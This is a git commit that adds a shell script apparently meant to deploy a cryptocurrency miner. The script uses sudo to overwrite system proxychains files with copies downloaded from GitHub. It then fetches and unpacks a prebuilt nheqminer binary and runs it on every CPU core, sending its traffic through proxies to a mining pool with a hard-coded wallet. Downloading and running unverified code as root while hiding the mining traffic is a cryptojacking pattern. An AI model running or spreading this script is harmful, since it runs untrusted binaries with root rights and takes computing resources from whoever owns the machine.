46cd6d1d92a32aa7fc76cb0d845dfe7fedf6e396
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-10-24 11:34:02 +0200

    Create nheqminer.sh

---
+++ nheqminer.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+sudo apt update;
+sudo apt -y install proxychains;
+
+sudo rm -f /etc/proxychains.conf
+wget -O /etc/proxychains.conf "https://raw.githubusercontent.com/chadpetersen1337/cpuminer/main/proxychains.conf"
+cat /etc/proxychains.conf
+
+sudo rm -f /usr/lib/proxychains3/proxyresolv
+wget -O /usr/lib/proxychains3/proxyresolv "https://raw.githubusercontent.com/chadpetersen1337/cpuminer/main/proxyresolv"
+cat /usr/lib/proxychains3/proxyresolv
+
+wget https://raw.githubusercontent.com/chadpetersen1337/cpuminer/main/nheqminer.tar
+tar -xvf nheqminer.tar
+cd nheqminer
+proxychains ./nheqminer -v -l na.luckpool.net:3956 -u RJG5nm96Axdhm1eQ4DbndhLq4JEPN3i7sW.nheqminer -p x -t $num_of_cores
